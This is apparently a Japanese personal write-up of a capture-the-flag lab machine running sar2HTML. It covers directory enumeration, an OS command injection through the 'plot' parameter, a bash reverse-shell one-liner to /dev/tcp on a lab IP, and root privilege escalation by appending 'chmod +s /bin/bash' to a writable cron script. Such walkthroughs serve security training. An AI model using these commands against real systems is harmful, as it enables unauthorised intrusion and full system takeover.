### 論点
- exploitが説明書
- cron
### keyword
- openssl passwd,urlencode,pkexec


### 課題
- x86_64
- meterpreterでリバースシェルできる



## 攻略
- `gobuster dir -u $IP -w $dirsmall`
  - phpinfo.php,robots.txt 
- phpinfo.php
  - サーバのいろんな情報がわかる  
- robots.txt
  - /sar2HTMLという謎の文字があるが、これはディレクトリっぽいのでサイトを見てみる
- sar2htmlをネットで検索すると、どうもシステム情報を統計的に表示させるソフトらしい。exploitを検索する。
- `searchsploit sar2HTML`
- `searchsploit -x 47204.txt` 
  - metasploitの実行ファイルでないのでcodeがなくosコマンンドインジェクションができる説明書
  - osコマンドインジェクションができるなら、まずやるのはreverse-shell
  - `-x`pagerとして読める
  - `-m`fileをダウンロードできる。mirrorと書いてあるが、コピーのこと
- reverse-shellをする
  - URLencodeは外部のサイトでないとなぜかダメ
  - 事前に~/tools/reverse-shell/にurlencodeしたreverse-shellは準備しておく
  - 順にやっていく、ncはダメ。rmとbashはOK
  - `http://192.168.56.104/sar2HTML/index.php?plot=;bash~`

- 対話シェルにする
- id
  - www-dataのみ 
  - www-dataなのでsudo -lは期待できない。パスワードが必要
- SUIDを探す
  - pkexecがある`version 0.105` 
- `ps aux | grep root`
  - だいたいいつものcronとapacheが動いている
  - crontabをチェックしてみる
- (補足) サイトのサーバ内での場所
  - phpinfo.phpで設定ファイルが見れる。その中にDocument_Rootがあって、そこに/var/www/htmlと書いてある。それで、そのDocument_Rootはどこで設定されているかというと、Server_rootに書いてある/var/www/ 
- `cat /etc/crontab`
  - 開けたファイルの一番下にfinally.shがルート権限で実行されているのがわかる。ちなみにcrontabに直接スクリプトが書いてあるのは珍しい、何も見れない時はpspyを使う 
  - `cat /var/www/html/finally.sh`
  - finally.shの中にwrite.shがある。5分ごとに実行されているのがわかる
  - `ls -l`でパーミッションを見たら書き込みできる 
- root取得の方法は3つ。ここでは(3)が楽なので、これでする
  - (1)バックドアをつける
  - (2)reverse-shellでrootになる
    - `bash -c 'exec bash -i &>/dev/tcp/192.168.56.104/9001 <&1'`
  - (3) bashをSUIDファイルにする
    - `echo 'chmod +s /bin/bash' >> write.sh`
    - `ls -l`でsになったら。次のコマンド
    - `bash -p`
